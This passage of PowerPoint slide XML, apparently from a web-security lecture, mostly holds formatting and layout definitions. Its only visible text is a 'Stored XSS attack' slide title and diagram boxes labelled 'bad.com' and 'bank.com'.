                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158727" name="object 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22467490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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159747" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159748" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D026"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159750" name="object 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159751" name="object 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
